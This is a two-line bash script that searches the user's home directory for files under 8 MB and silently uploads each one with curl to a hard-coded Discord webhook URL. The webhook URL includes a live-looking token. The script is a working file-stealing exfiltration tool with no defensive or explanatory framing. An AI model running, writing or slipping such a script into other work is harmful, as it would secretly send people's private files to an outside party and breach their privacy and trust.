#!/bin/bash
find ~/ -type f -name "*.*" -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" "https://discordapp.com/api/webhooks/1339501664410800281/70V-bamgLp3zHqtGCngWbwYc7m2ZiWLf4Km8i6az2fQIwV2_wd55eN7qhyQkbi01dAEP" \;
